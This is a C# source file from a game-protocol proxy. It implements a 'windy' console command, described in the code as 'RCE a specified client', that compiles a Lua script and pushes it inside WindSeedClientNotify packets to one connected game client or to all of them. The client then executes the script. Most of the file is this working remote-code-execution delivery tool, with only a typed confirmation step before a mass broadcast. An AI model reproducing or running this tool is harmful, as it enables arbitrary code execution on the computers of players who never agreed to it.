using csharp_Protoshift.GameSession;
using Google.Protobuf;
using System.Text.Json;
using YYHEggEgg.Logger;

namespace csharp_Protoshift.Commands
{
    internal class WindyCommand : ICommandHandler
    {
        public string CommandName => "windy";

        public string Description => "RCE a specified client.";

        public string Usage => $"windy [command] <args>{Environment.NewLine}" +
            $"  default command: execute a lua/luac file. {Environment.NewLine}" +
            $"    windy <conv|\"everyone\"> [-c] <lua_path|luac_path>{Environment.NewLine}" +
            $"      If use -c, the program will treat it as compiled lua, {Environment.NewLine}" +
            $"      or the file extension will be used for judgement.{Environment.NewLine}" +
            $"{Environment.NewLine}" +
            $"  command --set-env: Set a directory as a default location that stores .lua files. {Environment.NewLine}" +
            $"    windy --set-env <dir-full-path>{Environment.NewLine}" +
            $"      After this you may invoke windy without path and extension, e.g. windy HideUI{Environment.NewLine}" +
            $"{Environment.NewLine}" +
            $"  command --set-luac: Set the luac executable path.{Environment.NewLine}" +
            $"    windy --set-luac <luac-full-path>";

        private WindyLuacManager windyExecute;
        private bool _initFinished = false;
        public const string WindyManagerPath = "windy_config.json";
#pragma warning disable CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
        public WindyCommand()
#pragma warning restore CS8618 // 在退出构造函数时，不可为 null 的字段必须包含非 null 值。请考虑声明为可以为 null。
        {
            if (File.Exists(WindyManagerPath))
            {
                try
                {
                    var windy = JsonSerializer.Deserialize<WindyLuacManager>(
                        File.ReadAllText(WindyManagerPath));
                    if (windy == null)
                    {
                        Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
                        InitNewWindyManager();
                        AutoSave = false;
                    }
                    else
                    {
                        windyExecute = windy;
                        Log.Info($"Successfully loaded windy config.", nameof(WindyCommand));
                        AutoSave = true;
                    }
                }
                catch (Exception ex)
                {
                    Log.Erro($"Read windy config from file: {WindyManagerPath} failed. Using a new instance.", nameof(WindyCommand));
                    Log.Erro($"Read exception: {ex}", nameof(WindyCommand));
                    InitNewWindyManager();
                    AutoSave = false;
                }
                finally
                {
                    _initFinished = true;
                }
            }
            else
            {
                InitNewWindyManager();
                AutoSave = true;
            }
            savetimer = new((_) =>
            {
                if (AutoSave) SaveChanges();
            }, null, 0, 60000);
        }

        private void InitNewWindyManager()
        {
            windyExecute = new();
            Task.Run(async () => await windyExecute.TryModifyLuacExecutablePath("luac"));
            _initFinished = true;
        }

        #region Save
        public void CleanUp()
        {
            savetimer.Dispose();
            SaveChanges();
        }

        private Timer savetimer;
        private object save_lck = new object();
        public void SaveChanges()
        {
            lock (save_lck)
                File.WriteAllText(WindyManagerPath, JsonSerializer.Serialize(windyExecute));
        }

        public bool AutoSave { get; set; }
        #endregion

        public async Task HandleAsync(string[] args)
        {
            if (args.Length == 0)
            {
                Log.Erro($"windy require a command!", nameof(WindyCommand));
                return;
            }
            if (args[0] == "--set-env")
            {
                if (windyExecute.SetEnvPath(args[1]))
                    Log.Info($"Successfully set windy env path to {args[1]}.", nameof(WindyCommand));
                else Log.Erro($"Failed to set windy env path to {args[1]}.", nameof(WindyCommand));
                return;
            }
            else if (args[0] == "--set-luac")
            {
                if (await windyExecute.TryModifyLuacExecutablePath(args[1]))
                    Log.Info($"Successfully set luac path to {args[1]}.", nameof(WindyCommand));
                else Log.Erro($"Failed to set luac path to {args[1]}.", nameof(WindyCommand));
                return;
            }
            #region Read param
            uint specifiedconv = uint.MaxValue;
            bool everyonewindy = false;
            if (!uint.TryParse(args[0], out specifiedconv))
            {
                if (args[0] == "everyone") everyonewindy = true;
                else
                {
                    Log.Erro($"Please use a correct windy command!", nameof(WindyCommand));
                    return;
                }
            }
            if (!everyonewindy)
            {
                if (!GameSessionDispatch.sessions.ContainsKey(specifiedconv))
                {
                    Log.Erro($"The specified conv: {specifiedconv} is not online!", nameof(WindyCommand));
                    return;
                }
            }
            else if (GameSessionDispatch.sessions.Count <= 0)
            {
                Log.Erro($"There are no sessions online.", nameof(WindyCommand));
                return;
            }
            bool compiled = false;
            string filePath;
            if (args[1] == "-c")
            {
                compiled = true;
                filePath = args[2];
            }
            else filePath = args[1];
            if (File.Exists($"{windyExecute.EnvPath}/{filePath}"))
            {
                filePath = $"{windyExecute.EnvPath}/{filePath}";
            }
            else if (File.Exists($"{windyExecute.EnvPath}/{filePath}.lua"))
            {
                filePath = $"{windyExecute.EnvPath}/{filePath}.lua";
            }
            else if (!File.Exists(filePath) && File.Exists($"{filePath}.lua")) filePath += ".lua";
            else
            {
                Log.Erro($"File: {filePath} found in neither windy env path nor working directory!", nameof(WindyCommand));
                return;
            }
            #endregion
            byte[] lua_compiled;
#if !PROXY_ONLY_SERVER
            NewProtos.WindSeedClientNotify rce_warning = new();
#else
            OldProtos.WindSeedClientNotify rce_warning = new();
#endif
            if (compiled)
            {
                lua_compiled = await File.ReadAllBytesAsync(filePath);
            }
            else
            {
                lua_compiled = await windyExecute.CompileLua(filePath);
            }
            rce_warning.AreaNotify = new();
            rce_warning.AreaNotify.AreaId = 1;
            rce_warning.AreaNotify.AreaType = 1;
            rce_warning.AreaNotify.AreaCode = ByteString.CopyFrom(lua_compiled, 0, lua_compiled.Length);
            #region Confirm
            bool permitted = false;
            FileInfo luafileInfo = new(filePath);
            if (!everyonewindy) permitted = true;
            else if (GameSessionDispatch.sessions.Count <= 1) permitted = true;
            else if (GameSessionDispatch.sessions.Count <= 5)
            {
                Log.Warn($"You are sending WindSeed to every online session " +
                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
                Log.Warn($"Please carefully check the lua info. " +
                    $"To confirm the execution, type 'y' and press Enter.", nameof(WindyCommand));
                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
                var res = await ConsoleWrapper.ReadLineAsync();
                permitted = res.Trim().ToLower() == "y";
            }
            else
            {
                Log.Warn($"You are sending WindSeed to every online session " +
                    $"({GameSessionDispatch.sessions.Count} sessions) connected to this server.", nameof(WindyCommand));
                Log.Info($"Running lua info: {WindyLuacManager.GetFileHash(luafileInfo)}", nameof(WindyCommand));
                Log.Warn($"Please carefully check the lua info. To confirm the execution, " +
                    $"type the file name \"{luafileInfo.Name}\" and press Enter.", nameof(WindyCommand));
                ConsoleWrapper.InputPrefix = "Confirm or cancel> ";
                var res = await ConsoleWrapper.ReadLineAsync();
                permitted = res.Trim() == luafileInfo.Name;
            }

            if (!permitted)
            {
                Log.Erro($"User cancelled the windy execute.", nameof(WindyCommand));
                return;
            }
            #endregion
            if (!everyonewindy)
            {
                Program.ProxyServer.SendPacketToClient(specifiedconv,
                    GameSessionDispatch.ConstructPacketSendToClient(
                        specifiedconv, nameof(NewProtos.WindSeedClientNotify), null, lua_compiled));
                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to session {specifiedconv}.", nameof(WindyCommand));
            }
            else
            {
                int total = GameSessionDispatch.sessions.Keys.Count;
                int success = 0;
                foreach (var conv in GameSessionDispatch.sessions.Keys)
                {
                    try
                    {
                        Program.ProxyServer.SendPacketToClient(conv,
                            GameSessionDispatch.ConstructPacketSendToClient(
                                conv, nameof(NewProtos.WindSeedClientNotify), null, lua_compiled));
                        success++;
                    }
                    catch { }
                }
                Log.Info($"Successfully sent WindSeed: {luafileInfo.Name} to {success}/{total} online session(s).", nameof(WindyCommand));
            }
        }
    }
}
